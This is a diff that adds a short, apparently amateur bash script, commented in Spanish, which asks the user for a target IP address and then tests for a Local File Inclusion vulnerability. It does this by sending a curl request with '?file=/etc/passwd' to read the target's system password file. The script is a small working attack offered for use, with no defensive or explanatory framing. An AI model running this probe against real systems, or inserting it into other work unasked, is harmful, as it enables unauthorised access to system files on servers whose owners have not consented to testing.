@@ -1,0 +1,25 @@
+#!/bin/bash
+
+echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+
+
+
+
+# 1 = Local File Inclusion vulnerability
+
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+
+# Solicitar entrada del usuario para la prueba de inclusión de archivo
+read -p "Test file inclusion? s/N: " inclusion_test
+
+# Verificar si el usuario ingresó 's' o 'S' para realizar la prueba de inclusión de archivo
+if [[ $inclusion_test == "s" || $inclusion_test == "S" ]]; then
+    # Solicitar entrada del usuario para la dirección IP del objetivo
+    read -p "Ip? " target_IP
+    
+    # Ejecutar la solicitud Curl con la dirección IP proporcionada
+    curl "http://${target_IP}/?file=/etc/passwd"
+else
+    echo "No se realizará la prueba de inclusión de archivo."
+fi
+
